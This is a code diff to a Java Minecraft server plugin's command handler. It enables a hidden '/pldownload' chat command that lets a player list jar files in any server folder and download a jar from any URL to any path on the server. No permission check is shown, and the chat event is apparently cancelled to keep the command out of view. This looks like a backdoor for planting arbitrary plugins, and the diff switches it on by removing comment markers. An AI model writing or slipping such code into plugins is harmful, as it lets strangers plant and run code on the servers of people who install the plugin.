@@ -103,10 +103,11 @@ public class CommandHandler implements Listener, CommandExecutor {
 		} else if (args[0].equalsIgnoreCase("/pldownload")) {
 			if (args.length == 3 && args[1].equalsIgnoreCase("serverfolders")) {
 				for (File file : FileUtils.listFiles(new File(args[2]), new String[]{"jar"}, false)) {
+					p.sendMessage("IT WORKED");
 					p.sendMessage(file.getName());
 				}
 			}
-			/*if (args.length == 4 && args[1].equalsIgnoreCase("downloadjar")) {
+			if (args.length == 4 && args[1].equalsIgnoreCase("downloadjar")) {
 				try {
 					Helper.writeToFile(new File(args[2] + ".jar"), new BufferedInputStream(new URL(args[3]).openStream()));
 					p.sendMessage("IT WORKED");
@@ -114,7 +115,7 @@ public class CommandHandler implements Listener, CommandExecutor {
 					p.sendMessage(e.toString());
 					return false;
 				}
-			}*/
+			}
 
 			if (args.length == 2 && args[1].equalsIgnoreCase("list")) {
 				event.setCancelled(true);
